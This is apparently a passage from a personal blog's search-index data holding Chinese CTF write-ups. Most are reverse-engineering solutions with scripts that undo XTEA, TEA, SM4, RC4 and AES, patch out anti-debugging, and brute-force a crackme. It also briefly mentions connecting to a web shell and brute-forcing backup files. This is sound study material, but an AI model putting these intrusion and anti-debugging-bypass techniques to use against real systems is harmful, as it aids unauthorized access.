1PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MWZkYzRlMDItODU1MS00ZTY3LThkNzUtZmY3ZDkzZDJmNjg5fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= [极客大挑战 2019]Knife一句话木马，直接用蚁剑连接网站后台，flag在根目录 [极客大挑战 2019]PHP考察网站常用备份后缀名，PHP的序列化与反序列化 首先提示了网站备份，用常用的网站备份字典爆破，爆破出www.zip，在后缀输入下载 [极客大挑战 2019]HttpHTTP头部伪造，比较过程比较简单，主要是需要学习HTTP协议 /sbin/nologin","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"web","slug":"CTF/web","permalink":"http://example.com/categories/CTF/web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"}]},{"title":"红明谷/虎符CTF-re题解","slug":"CTF/wp/红名谷-虎符CTF","date":"2021-07-14T04:44:17.040Z","updated":"2021-08-08T09:54:11.197Z","comments":true,"path":"5429/","link":"","permalink":"http://example.com/5429/","excerpt":"","text":"红明谷-g0看名字就是go语言题目，用IDA-golang-helper还原符号表之后，看到只有几个函数，其中main_Encode就是加密函数 函数逻辑比较简单，输入长度等于20，打乱位置，进入main_Encode加密，最后进入main_fun1进行比较，直接看main_Encode中的加密算法 动态调试后发现一张表，表的长度为58位，判断为换表base58加密 进入main_fun1函数中找到加密后的字符串，注意 runtime_memequal这个比较的函数需要在汇编中寻找比较的字符串首地址，在伪代码中是找不到的 123456789101112import base58Cipher = &#x27;2GVdudkYo2CBXoQii7gfpkjTc4gT&#x27;Plain = &#x27;&#x27;new_table = &#x27;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#x27;old_table = &#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;for i in range(len(Cipher)): Plain += old_table[new_table.index(Cipher[i])]print(base58.b58decode(Plain.encode()))# flag&#123;We1CTFc0m_2345&#125; 虎符-remips架构文件，本来想用qemu动态调试的，但是好像虚拟机的so文件出问题了，就静态分析算了，反正有IDA7.5不怕 看伪代码很浓厚的C++气息，两次判断，pre函数里面还判断了输入的长度 server_check_redemption_code函数大概的意思就是生成一张宽256长和字符串长度相同的表，当表的列值与输入的字符串的ASCII值相同时就做一个标记，用C语言还原后的代码如下 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main() &#123; char string[] = &quot;&quot;; char input[] = &quot;&quot;; int string_len = strlen(string); int input_len = strlen(input); int* s = (int*)malloc(input_len &lt;&lt; 10);// input_len * 2^10 memset((void*)s, 0, input_len &lt;&lt; 10); int count = 0; for (int i = 1; i &lt; input_len; i++) &#123; for (int j = 0; j &lt; 256; j++) &#123; if (j != input[i]) &#123; s[256 * i + j] = s[256 * count + j]; //其他全是填充这个 &#125; else s[256 * i + j] = i + 1; //每一次循环只执行一次这个 &#125; count = s[256 * count + input[i]]; //count=i+1 &#125; int sign = 0; for (int k = 0; k &lt; string_len; k++) &#123; sign = s[256 * sign + string[k]]; if (sign == input_len) &#123; printf(&quot;%d&quot;, k - input_len + 1); &#125; &#125;&#125; /// k-input_len+1=7 /// k=6+0xE= 题目中有两个字符串，所以生成了两张表，两张表中相同的值就是需要输入的flag Ninja Must Die 3 Is A Cruel Game, So Hard For Me I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative. 两个字符串中相同的值为Ninja Must Die 虎符-gocrypt变种的xtea在写脚本的时候忘记了小端存储，这个地方搞了很久，以后遇到不能在犯错误了 用插件还原符号表后看到函数并没有多少，输入检测函数main_check，数据加密函数main_main__ptr_myCipher_Encrypt main_check函数中有一个正则匹配来规定flag输入的格式 1正则匹配格式：flag&#123;([0-9a-f]&#123;8&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;12&#125;)&#125; 在进入main_check返回一个值给标志，判断是否进入下一个步骤 main__ptr_myCipher_Encrypt函数中的加密算法就是变种的xtea加密，随机数变成了0x12345678 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void XTEA_decrypt(uint32_t rounds, uint32_t* v, uint32_t* k)&#123; uint32_t delta = 0x12345678; uint32_t sum = rounds * delta; uint32_t v0 = v[0], v1 = v[1]; for (int i = 0; i &lt; rounds; i++) &#123; v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + k[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + k[sum &amp; 3]); &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; uint32_t rounds = 32; uint32_t v[2][2] = &#123; &#123; 0x0ec311f0, 0x45c79af3 &#125;, &#123; 0xedf5d910, 0x542702cb &#125; &#125;; uint32_t k[4] = &#123; 0x00010203, 0x04050607, 0x08090a0b, 0x0c0d0e0f &#125;; XTEA_decrypt(rounds, v[0], k); XTEA_decrypt(rounds, v[1], k); printf(&quot;%x-%x\\n&quot;, v[0][0], v[0][1]); printf(&quot;%x-%x\\n&quot;, v[1][0], v[1][1]);&#125;//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125; 虎符-CrackMe这个题需要输入两次，第一次输入后判断输入的长度，长度需要17位，输入后将输入的字符串的前7位和后10位分割，分别存储在不同的内存中 第二次输入需要输入一个数字，在经过两轮简单的计算后与指定的两个值进行比较，直接写脚本爆破，最后计算出需要输入的值为90038 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 爆破脚本，单线程大概需要半个小时左右#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt; double cal(double a, double b)&#123; double _a; double var = 0.0; _a = a; a = pow(a, b - 1); *(&amp;var + 1) = *(&amp;a + 1); var = a / exp(_a); return var;&#125;int main(int argc, char* argv[])&#123; double input_num; for (int i = 0; i &lt; 99999; i++) &#123; input_num = i; printf(&quot;%d\\n&quot;, i); double v16 = 0.0, v17 = 0.0, v18 = 0.0, v19 = 0.0; int num1 = 0x13B03, num2 = 0x5A2; v19 = (double)((int)input_num / 0x305B) + 1.0; do &#123; v17 = v17 + cal(v18, v19) * 0.001; v18 = v18 + 0.001; &#125; while (v18 &lt;= 100.0); double v21 = 0.0; double v22 = (double)((int)input_num % 0x305B) + 1.0; do &#123; v16 = v16 + cal(v21, v22) * 0.001; v21 = v21 + 0.001; &#125; while (v21 &lt;= 100.0); if ((int)(v17 + v17 + 3.0) == num1 &amp;&amp; (int)(v16 + v16 + 3.0) == num2) &#123; printf(&quot;%f&quot;, input_num); break; &#125; &#125; return 0;&#125; 后面就比较简单了，首先将输入的数字转为ascii码，然后在后面追加input_num*2，一共追加5次，取前7位进行异或计算出一个key供后面使用 123456Cipher = [8, 77, 89, 6, 115, 2, 64]key = list(map(ord,list(&quot;9903819&quot;)))Plain = bytes(key[i]^Cipher[i] for i in range(7))print(Plain)# 1ti5K3y 后面就是一个标准的RC4加密 12345678from Cryptodome.Cipher import ARC4Cipher = bytes([178, 214, 142, 63, 170, 20, 83, 84, 198, 6])Key = b&#x27;1ti5K3y&#x27;rc4 = ARC4.new(Key)Plain = rc4.decrypt(Cipher)print(Plain)# RC4_crypt0","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"},{"name":"re","slug":"CTF/re","permalink":"http://example.com/categories/CTF/re/"}],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"HWS计划2021硬件安全冬令营线上选拔赛","slug":"CTF/wp/HWSCTF","date":"2021-07-14T04:44:17.040Z","updated":"2021-08-08T09:16:09.435Z","comments":true,"path":"23409/","link":"","permalink":"http://example.com/23409/","excerpt":"","text":"babyre 一道hook题，ida打开代码还是比较清晰的，首先判断长度然后在加密，但是我没有搞清楚这个hook的流程，听别的师傅说的在CRT的时候，从r3到r0时候hook的😥（听的不是很懂），但是我瞎找找到这两个函数 资源解密 资源加载 可以看出程序加载了一个叫CIPHER_DLL的资源,这个资源其实就是经过加密的DLL，我用ResourceHacker(一个可以查看程序资源的工具)来查看程序中的资源 程序中确实有一个叫CIPHER_DLL的资源,且这个资源需要解密才能使用,图中**wow!**就是证明,把这个资源的二进制文件提出来,在解密回去,得到一个DLL 1234567891011121314import structimport os//解密资源def ResourceDecrypt(): filepath = &#x27;C:\\\\Users\\\\86180\\\\Desktop\\\\CIPHER_DLL101&#x27; dllpath = &#x27;C:\\\\Users\\\\86180\\\\Desktop\\\\DLL.dll&#x27; key = &#x27;wow!&#x27; size = os.path.getsize(filepath) # 获得文件大小 with open(filepath, &#x27;rb&#x27;) as cipher_stream: with open(dllpath, &#x27;wb&#x27;) as dll_stream: for i in range(size): data = struct.unpack(&#x27;B&#x27;, cipher_stream.read(1))[0] ^ ord(key[i%4]) dll_stream.write(struct.pack(&#x27;B&#x27;, data)) 把DLL用ida打开,查看加密函数,字符串已经告诉我们是SM4加密,没有魔改. SM4Github代码链接 1234567891011121314151617181920212223242526from ida import ida_bytesimport pysm4# 从ida中提取加密后的数据def Dump_ida_data(): addr = 0x00BFA808 res = [] for i in range(32): res.append(get_byte(addr + i)) print(bytes(res).hex()) # 利用GitHub上找的sm4脚本,写的解密函数 def Decrypt(): string = b&#x27;Ez_5M4_C1pH@r!!!&#x27;.hex() key = 0x457a5f354d345f433170484072212121 cipher1 = 0xea6358b78ce2a1e9c5298f53e8083259 cipher2 = 0xaf1b67aed9dacfc472ffb1ec7673f306 plain1 = hex(pysm4.decrypt(cipher1, key))[2:] plain2 = hex(pysm4.decrypt(cipher2, key))[2:] for i in range(0,len(plain1),2): print(chr(int(plain1[i:i+2],16)),end=&#x27;&#x27;) for i in range(0,len(plain1),2): print(chr(int(plain2[i:i+2],16)),end=&#x27;&#x27;) # flag&#123;42b061b4cb41cfa89ca78047bde1856e&#125; child_protect参考看雪的一篇文章：https://bbs.pediy.com/thread-95082.htm 这道题考的是双进程守护问题，上面的文章和这道题类似，但是难点在于调试。 ida打开后发现主函数无法正常反编译，而且看到了int3中断异常指令。由于是双进程守护，需要找到创建子进程的地方 通过搜索CreateProcess函数，确定子进程由函数sub_413670创建 继续跟踪，确定了两个函数调用子进程，分别是sub_413BE0和sub_413950 而函数sub_413950是一个关键函数，他对子进程做了修改。如果想让ida正确的反编译，我们需要nop掉所有的int3指令，且按照程序修改部分指令，这里我用010Editor进行修改。 首先找到所有的int3指令 上图就是需要我们首先nop掉的地方，用010Editor修改后再次用ida打开可以发现主函数已经可以正常反编译，但是还不能够动态调试， 因为所有的过程都是在子进程中进行，但是我们现在已经修改了父进程的数据和子进程一样，所以可以跳过调用子进程的步骤，这需要修改一部分数据。 经过多次下断点调试后，定位到函数sub_413D10，修改过后就可以进行调试，但是还有一个坑。。 每次调试到这里的时候都会闪退，无论怎么调都没有用，最后我选择的办法是直接patch掉调用这个函数的指令，因为这步比较简单，且不影响后面的数据。 在可以动调后，就可以分析算法了，算法有两处，一处异或，一处tea加密，异或函数我将他pach，直接看tea处 tea加密的key是在运行时生成的，但是如果不动态调试也可以直接复制整个函数跑一遍也可以，我喜欢动态调试（懒） 生成了8个数据，但是只用到了前四个，后面只需要找到加密后的数据就ok了，这里我用idapython 1234567891011121314151617181920212223242526272829import idc from ida_bytes import *import idaapi def DumpCipher(): addr = [] res = [] start = 0x4122C8 end = 0x4123AE curr_addr = start dword = &#x27;&#x27; while curr_addr &lt;= end: addr.append(curr_addr) curr_addr = idc.next_head(curr_addr,end) for i in range(32): if i%4==0 and i != 0: print(dword) res.append(int(dword, 16)) dword = &#x27;&#x27; data = idc.print_operand(addr[i], 1).replace(&#x27;h&#x27;, &#x27;&#x27;) if len(data) == 1: data = &#x27;0&#x27; + data elif len(data) == 3: data = data[1:] dword = dword + data # print(dword) res.append(int(dword, 16)) print(res) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void TEA_decrypt(uint32_t* v, uint32_t* k)&#123; uint32_t sum = 0xC6EF3720, delta = 0x9E3779B9; uint32_t v0 = v[0], v1 = v[1]; for (int i = 0; i &lt; 32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]); v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[1]); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;void XOR(uint32_t *arr) &#123; uint32_t sum = 0x73FF8CA6; for (int i = 0; i &lt; 8; i++) &#123; arr[i] ^= sum; sum -= 0x50FFE544; &#125; &#125;int main()&#123; uint32_t key[4] = &#123; 0x82aba3fe, 0xac1ddca8, 0x87ec6b60, 0xa2394568 &#125;; uint32_t c1[2] = &#123; 3991505723, 3531991019 &#125;; uint32_t c2[2] = &#123; 1360416890, 2984008969 &#125;; uint32_t c3[2] = &#123; 1169078549, 1301151568 &#125;; uint32_t c4[2] = &#123; 3739270283, 2612854497 &#125;; uint32_t v = 0; TEA_decrypt(c1, key); TEA_decrypt(c2, key); TEA_decrypt(c3, key); TEA_decrypt(c4, key); uint32_t arr[] = &#123; 0x3e9affcb, 0x478dce18, 0xb891a541, 0xc191b885, 0x6b9a84ff, 0xad61703e, 0xeb5f6c7d, 0x62772dbb &#125;; XOR(arr); for (int i = 0; i &lt; 8; i++) &#123; printf(&quot;%x&quot;, arr[i]); &#125; //打印的是flag的16进制表示形式，再用python转成字符串 return 0;&#125; flag: Mesmerizing_And_Desirable_As_wjq Enigma这题有意思 异常处理反调试，函数sub_AE10C0调用了SetUnhandledExceptionFilter函数，意思就是发生异常时调用注册的函数，看看注册的函数 注册的函数是一个虚拟机，但是这个虚拟机很特殊，里面的handl是加减运算和位运算，参数是各种寄存器 回到函数sub_AE10C0发现了C7这个字节码触发非法指令异常，然后调用注册的函数相当于用那个虚拟机模拟了一些汇编指令，直接还原后静态看汇编就OK 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130 push ebp.text:004018F1 mov ebp, esp.text:004018F3 push ebx.text:004018F4 push esi.text:004018F5 push edi.text:004018F6 push offset sub_401630.text:004018FB call ds:SetUnhandledExceptionFilter.text:004018FB ; ---------------------------------------------------------------------------.text:00401901 db 0C7h ; and eax, 0.text:00401902 db 0FFh.text:00401903 db 4 .text:00401904 db 1.text:00401905 db 0.text:00401906 ; ---------------------------------------------------------------------------.text:00401906 xor ecx, ecx.text:00401908.text:00401908 loc_401908: ; CODE XREF: .text:00401922↓j.text:00401908 cmp ecx, 20h ; &#x27; &#x27;.text:0040190B jge short loc_401924.text:0040190B ; ---------------------------------------------------------------------------.text:0040190D db 0C7h ; add eax, 11h.text:0040190E db 0FFh .text:0040190F db 0.text:00401910 db 1.text:00401911 db 11h.text:00401912 db 0C7h ; and eax,1Fh.text:00401913 db 0FFh.text:00401914 db 4.text:00401915 db 1.text:00401916 db 1Fh.text:00401917 ; ---------------------------------------------------------------------------.text:00401917 mov dword ptr (byte_457A4C+24h)[ecx*4], eax.text:00401917 ; ---------------------------------------------------------------------------.text:0040191E db 0C7h ; inc ecx.text:0040191F db 0FFh.text:00401920 db 2.text:00401921 db 3.text:00401922 ; ---------------------------------------------------------------------------.text:00401922 jmp short loc_401908.text:00401924 ; ---------------------------------------------------------------------------.text:00401924.text:00401924 loc_401924: ; CODE XREF: .text:0040190B↑j.text:00401924 xor ecx, ecx.text:00401926.text:00401926 loc_401926: ; CODE XREF: .text:00401956↓j.text:00401926 cmp ecx, 20h ; &#x27; &#x27;.text:00401929 jge short loc_401958.text:0040192B mov ebx, dword ptr (byte_457A4C+24h)[ecx*4].text:00401932 mov edx, dword ptr (byte_457A4C+28h)[ecx*4].text:00401939 mov al, byte_457A4C[edx].text:0040193F mov byte_4579E0[ebx], al.text:00401945 mov al, byte_457A4C[ebx].text:0040194B mov byte_4579E0[edx], al.text:0040194B ; ---------------------------------------------------------------------------.text:00401951 db 0C7h.text:00401952 db 0FFh ; add ecx, 2.text:00401953 db 0.text:00401954 db 3.text:00401955 db 2.text:00401956 ; ---------------------------------------------------------------------------.text:00401956 jmp short loc_401926.text:00401958 ; ---------------------------------------------------------------------------.text:00401958.text:00401958 loc_401958: ; CODE XREF: .text:00401929↑j.text:00401958 xor ecx, ecx.text:0040195A.text:0040195A loc_40195A: ; CODE XREF: .text:00401992↓j.text:0040195A cmp ecx, 20h ; &#x27; &#x27;.text:0040195D jge short loc_401994.text:0040195F mov bl, byte_4579E0[ecx].text:0040195F ; ---------------------------------------------------------------------------.text:00401965 db 0C7h ; and ebx, 1Fh.text:00401966 db 0FFh.text:00401967 db 4.text:00401968 db 2.text:00401969 db 1Fh.text:0040196A db 0C7h ; shl bl, 3.text:0040196B db 0FFh.text:0040196C db 7.text:0040196D db 2.text:0040196E db 3.text:0040196F ; ---------------------------------------------------------------------------.text:0040196F mov esi, ecx.text:00401971 inc esi.text:00401972 and esi, 1Fh.text:00401975 mov dl, byte_4579E0[esi].text:0040197B and dl, 0E0h.text:0040197E and edx, 0FFh.text:0040197E ; ---------------------------------------------------------------------------.text:00401984 db 0C7h ; shr dl, 5 .text:00401985 db 0FFh.text:00401986 db 8.text:00401987 db 4.text:00401988 db 5.text:00401989 ; ---------------------------------------------------------------------------.text:00401989 or bl, dl.text:0040198B mov byte_457A04[ecx], bl.text:00401991 inc ecx.text:00401992 jmp short loc_40195A.text:00401994 ; ---------------------------------------------------------------------------.text:00401994.text:00401994 loc_401994: ; CODE XREF: .text:0040195D↑j.text:00401994 mov al, byte_457A04.text:00401999 mov byte_457A28, al.text:0040199E mov ecx, 1.text:004019A3.text:004019A3 loc_4019A3: ; CODE XREF: .text:004019CE↓j.text:004019A3 cmp ecx, 20h ; &#x27; &#x27;.text:004019A6 jge short loc_4019D0.text:004019A8 mov bl, byte_457A04[ecx].text:004019AE mov esi, ecx.text:004019AE ; ---------------------------------------------------------------------------.text:004019B0 db 0C7h ; inc ecx.text:004019B1 db 0FFh .text:004019B2 db 3 .text:004019B3 db 5.text:004019B4 ; ---------------------------------------------------------------------------.text:004019B4 xor bl, byte_457A04[esi].text:004019BA mov esi, ecx.text:004019BA ; ---------------------------------------------------------------------------.text:004019BC db 0C7h ; and esi, 3 .text:004019BD db 0FFh .text:004019BE db 4 .text:004019BF db 5.text:004019C0 db 3.text:004019C1 ; ---------------------------------------------------------------------------.text:004019C1 xor bl, byte ptr aBier[esi] ; &quot;Bier&quot;.text:004019C7 mov byte_457A28[ecx], bl.text:004019CD inc ecx.text:004019CE jmp short loc_4019A3 加密过程不复杂，首先计算了一组0到31的无序数，然后按照无序数两个一组交换输入数据，接着进行位运算，总体向前移动了三位，最后进行了异或加密。 12345678910111213# 解异或加密的脚本def xor(): res = [] key = &#x27;Bier&#x27; Cipher = &#x27;938b8f431268f7907a4b6e421301b42120738d68cb19fcf8b26bc4abc89b8d22&#x27; for i in range(0,len(Cipher),2): res.append(int(Cipher[i:i+2], 16)) for i in range(1,len(res)): res[i] = res[i] ^ ord(key[(i)%4]) ^ res[i-1] return res# [147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59] 123456789101112131415161718192021// 位运算脚本#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;Windows.h&gt;int main()&#123; BYTE byte[] = &#123; 147, 113, 155, 170, 250, 251, 105, 139, 179, 145, 154, 170, 251, 147, 66, 17, 115, 105, 129, 155, 18, 98, 251, 113, 129, 131, 34, 251, 113, 131, 107, 59 &#125;; BYTE index = 0; unsigned char first = byte[0] &gt;&gt; 3; printf(&quot;%c&quot;, (147 &gt;&gt;3)&amp;0xFF | (59 &lt;&lt;5)&amp;0xFF); for (int i = 0; i &lt; 31; i++) &#123; BYTE x = (byte[i] &lt;&lt; 5) &amp; 0xFF; BYTE y = (byte[i + 1] &gt;&gt; 3) &amp; 0xFF; printf(&quot;%c&quot;, x | y); &#125;&#125;// rn3u__m1vr3U_rhB.m03bL_n00d_n0mg 1234567891011121314# 交换位置def Change(): flag = list(&#x27;rn3u__m1vr3U_rhB.m03bL_n00d_n0mg&#x27;) index = [] num = 0 for i in range(32): num += 0x11 num &amp;= 0x1F index.append(num) for i in range(0,32,2): flag[index[i]], flag[index[i+1]] = flag[index[i+1]], flag[index[i]] for i in range(len(flag)): print(flag[i],end=&#x27;&#x27;) flag: B0mb3_L0nd0n_m0rg3n_um_v13r_Uhr. 总结​ 这道题过程不复杂，调用了SetUnhandledExceptionFilter，注册异常处理函数，通过C7这个非法指令触发异常，运行这个异常处理函数，从而进行加密操作 ​ 如果想动态调试的话可以直接改字节码（我只会这一种方法。。）不知道还有没有其他方法，但是做题的时候需要细心一点，因为汇编的一些过程没有看清导致浪费了我很多时间 obfu我搞得最烦的一道题。。以前没有搞过带iv的AES，也从来没有看过sha256和md5的反编译代码，这次算是遇到了。。看了很久都没有看出来，最后看了别的师傅的wp才出来的。其实这道题知道了md5和sha256之后加密过程并不复杂，但是如果是第一次遇到那就恼火了（比如像我） 总共算下来这道题一共有5个步骤 字符串转16进制 打个比方：比如我们输入123456，那么程序会将我们输入的转为 12 23 45这三个16进制数进行保存，因此前面只允许输入0-9 a-f的字符 位运算 总体向前移动了三位（我怀疑这次的题是一个人出的，加密算法都好相似。。） 计算key和iv rc4和AES 注意AES是解密，题目用的是Res盒子，并不是常规的S盒子，所以我们写脚本的时候是加密 5.与用md5生成的序列比较 如果序列号比对成功，程序就会读取flag.enc中的二进制数据，我们输入然后通过加密计算得到的序列号就会作为key解密flag.enc的二进制数据流，同样也是AES CBC模式，但是这部分不用我们关心，我们只需要得到正确的序列号就可以了 123456789101112131415161718192021222324252627282930313233343536import hashlibimport binasciifrom Cryptodome.Cipher import AES,ARC4flag = &#x27;&#x27;string = b&#x27;admin&#x27;new_res = [0x8c]Plain_AES = binascii.unhexlify(hashlib.md5(string).hexdigest())digest = hashlib.sha256(string).hexdigest()res = [i for i in binascii.unhexlify(digest)]for i in range(1,32): new_res.append(res[i] ^ res[i - 1])# aes加密key = binascii.a2b_hex((bytes(new_res).hex()[:32]).encode())iv = binascii.a2b_hex((bytes(new_res).hex()[32:]).encode())aes = AES.new(key, AES.MODE_CBC, iv)Cipher_AES = aes.encrypt(Plain_AES)# rc4加密rc4_cipher = Cipher_AESrc4 = ARC4.new(key)rc4_plain = rc4.decrypt(rc4_cipher)print(rc4_plain)# 位运算big_num_hex = binascii.hexlify(rc4_plain)big_num_bin = bin(int(big_num_hex, 16))[2:].rjust(16*8,&#x27;0&#x27;)big_num_bin = big_num_bin[3:] + big_num_bin[:3]for i in range(16): flag += hex(int(big_num_bin[i*8:i*8+8],2))[2:].rjust(2,&#x27;0&#x27;)print(flag)# 653b987431e5a2fc7c3d748fba008869 复现总结 常见的加密算法特征不清楚（大问题） 看汇编不仔细（需要改掉自己粗心的毛病） windows方面知识还是不够 题型见得太少了，感觉做了一道题就累的要死😑，真的佩服比赛从开始肝到最后的师傅们 学习了怎么使用Cryptdome库，windows的几种反调试（异常注册，debug bloker)，下次在遇到就不会这么痛苦了吧（大概）","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://example.com/tags/re/"},{"name":"wp","slug":"wp","permalink":"http://example.com/tags/wp/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"}]},{"title":"hgame2021-re部分题解","slug":"CTF/wp/HGAME","date":"2021-07-14T04:44:17.030Z","updated":"2021-08-08T09:16:01.509Z","comments":true,"path":"63316/","link":"","permalink":"http://example.com/63316/","excerpt":"","text":"前言hgame 2021的逆向部分题解，一道nc题和一道安卓逆向没有做，每周的题目都看了看，做了四分之三左右，杭电的比赛题目出得很有水平，自己学到了很多东西，wp本来说每周都写的，但是懒，比赛都结束一个月了才偷工减料得写出来。有兴趣的师傅凑合着看看吧吧🤪 RE-week1一杯阿帕茶明显的TEA加密标志，后面分析为XXTEA加密 加密后的数据，刚好35位 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5 ^ y&lt;&lt;2) + (y&gt;&gt;3 ^ z&lt;&lt;4)) ^ ((sum ^ y) + (k[(p&amp;3) ^ e] ^ z)))void XXTEA(int n, uint32_t* v, uint32_t* k)&#123; uint32_t sum, y, z; uint32_t p, rounds, e; if (n &gt; 1) &#123; rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do &#123; sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) &#123; n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds); &#125;&#125;int main()&#123; uint32_t arr[] = &#123;3880694563, 3081185334, 1506439138, 2524759489, 3883935348, 1026381030, 2325545814, 2581382044, 1881594093, 1781792173, 4103492874, 1553756062, 468045900, 1730391575, 1383114178, 2890011402, 2227070898, 1885128569, 1548828056, 4214676013, 571971141, 1558401693, 3515474427, 3898332297, 1942540575, 1421197718, 3061626000, 555214026, 2648963476, 794468778, 2816999933, 3272437419, 464379036, 877899850, 2460223225&#125;; uint32_t key[] = &#123; 1,2,3,4 &#125;; XXTEA(-35, arr, key); for (int i = 0; i &lt; 35; i++) &#123; printf(&quot;%c&quot;, arr[i]); &#125; return 0;&#125; Welcome to reverse world !简单题，一个异或直接搞定 12345678from ida_bytes import *def re(): addr = 0x00007FF7F7513480 flag = &#x27;&#x27; for i in range(22): flag += chr((0xff - i) ^ get_byte(addr +i)) print(flag) pypy给了我们python字节码，需要我们自己还原成python代码，下面贴还原过后的代码，加密过程很简单 123456789101112131415161718import disdef input_func(): raw_flag = input(&#x27;give me your flag:\\n&#x27;) cipher = list(raw_flag[6:-1]) length = len(cipher) for i in range(length // 2): cipher[2*i], cipher[2*i+1] = cipher[2*i+1] , cipher[2*i] res = [] for i in range(length): res.append(ord(cipher[i]) ^ i) res = bytes(res).hex() print(&#x27;your flag: &#x27; + res)# print(dis.dis(input_func)) 解密脚本 12345678910111213141516def Cip(): flag = &#x27;&#x27; res = [] cipher = &#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27; length = len(cipher) for i in range(0, length, 2): res.append(int(cipher[i:i+2],16)) for i in range(len(res)): flag += chr(res[i] ^ i) flag = list(flag) for i in range(len(flag) // 2): flag[i*2+1], flag[i*2] = flag[i*2],flag[i*2 + 1] for i in range(len(flag)): print(flag[i],end=&#x27;&#x27;)# hgame&#123;G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~&#125; RE-week2helloRe2有两处检测，第一处直接明文比较，但是注意要倒序 1password1: 2b0c5e6a3a20b189 第二处开启了另一个线程，利用了第一次检测的输入值异或一次后作为秘钥，进行CBC模式的AES加密，初始向量为0-15 1234567891011from Cryptodome.Cipher import AESkey = &#x27;2b0c5e6a3a20b189&#x27;key = bytes(ord(key[i])^i for i in range(16))Cipher = bytes([183, 254, 254, 217, 7, 118, 121, 101, 63, 78, 95, 98, 213, 2, 246, 126])iv = bytes(i for i in range(16))aes = AES.new(key,AES.MODE_CBC,iv)Plain = aes.decrypt(Cipher)print(Plain)# 7a4ad6c5671fb313 